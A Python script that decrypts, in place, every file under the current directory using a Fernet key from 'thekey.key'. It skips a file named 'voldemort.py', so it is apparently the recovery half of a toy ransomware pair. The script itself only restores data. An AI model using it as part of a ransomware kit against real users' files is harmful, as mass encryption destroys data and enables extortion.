import os
from cryptography.fernet import Fernet

# Get a list of files to decrypt, including those in subdirectories
def get_files_to_decrypt(base_dir):
    files = []
    for dirpath, _, filenames in os.walk(base_dir):
        for file in filenames:
            if file in {"voldemort.py", "thekey.key", "decrypt.py"}:
                continue
            files.append(os.path.join(dirpath, file))
    return files

# Decrypt files
def decrypt_files(files, secretkey):
    cipher = Fernet(secretkey)
    for file in files:
        with open(file, "rb") as thefile:
            contents = thefile.read()
        contents_decrypted = cipher.decrypt(contents)
        with open(file, "wb") as thefile:
            thefile.write(contents_decrypted)
        print(f"Decrypted: {file}")

# Main execution
if __name__ == "__main__":
    # Load the secret key
    with open("thekey.key", "rb") as key:
        secretkey = key.read()

    # Get list of files to decrypt in current directory and subdirectories
    files_to_decrypt = get_files_to_decrypt(".")
    print("Files to decrypt:", files_to_decrypt)

    # Decrypt the files
    decrypt_files(files_to_decrypt, secretkey)
